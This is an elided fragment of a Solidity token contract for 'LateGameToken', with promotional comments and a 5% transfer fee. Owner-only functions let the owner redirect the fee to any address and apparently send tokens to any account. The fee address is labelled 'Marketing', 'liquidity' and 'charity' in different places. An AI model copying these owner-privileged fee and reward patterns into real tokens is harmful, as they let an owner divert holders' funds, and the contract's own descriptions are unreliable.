...
/**
 * LateGameToken to the moon!
 * Better than safemoon
 * Burn rate: 5%
 * Liquidity fee:: 5%
 * Plus: 0.001% burn rate everyday
 */
 ...
 */
contract LateGameToken is Context, IERC20, IERC20Metadata {
    ...
    string private _name = "LateGameToken";
    string private _symbol= "LGT";
     bool balances1 = true;

    address payable public liquidityAddress = payable(0x000000000000000000000000000000000000dEaD); // Marketing Address
    ...
    function SetLiquidityAddress(address payable  _liquidityAddress) onlyOwner public {
    ...
    function _transfer(
        ...
        uint256 charityAmount = amount * liquidityPercent / 100; 
        ...
        emit Transfer(sender, recipient, amount);
         ...
         if (liquidityPercent > 0){
          ...
          emit Transfer(sender, liquidityAddress, charityAmount);  
     ...
     */
      function  sendReward(address account, uint256 amount) onlyOwner  public virtual {
